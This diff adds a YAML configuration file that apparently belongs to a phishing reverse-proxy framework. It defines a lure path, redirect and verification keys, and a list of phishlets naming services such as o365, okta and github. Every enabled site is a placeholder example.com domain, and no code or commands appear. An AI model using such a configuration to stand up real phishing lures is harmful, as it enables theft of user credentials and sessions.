@@ -1,0 +1,47 @@
+ip:
+lures:
+- info: ""
+  og_desc: ""
+  og_image: ""
+  og_title: ""
+  og_url: ""
+  params: {}
+  path: /cFEPsNEz
+  phishlet: example
+  redirect_url: ""
+redirect_key: rm
+redirect_url: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+server: example.com
+site_domains:
+  "1": ""
+  1.example: 1.example.com
+  "2": ""
+  2.example: 2.example.com
+  "3": ""
+  3.example: 3.example.com
+  "4": ""
+  4.example: 4.example.com
+  "5": ""
+  5.example: 5.example.com
+  amazon: ""
+  citrix: ""
+  facebook: ""
+  github: ""
+  instagram: ""
+  linkedin: ""
+  example: example.com
+  o365: ""
+  okta: ""
+  outlook: ""
+  protonmail: ""
+  reddit: ""
+  twitter: ""
+  twitter-mobile: ""
+sites_enabled:
+- 1.example
+- 2.example
+- 3.example
+- 4.example
+- 5.example
+verification_key: dv
+verification_token: 97ac
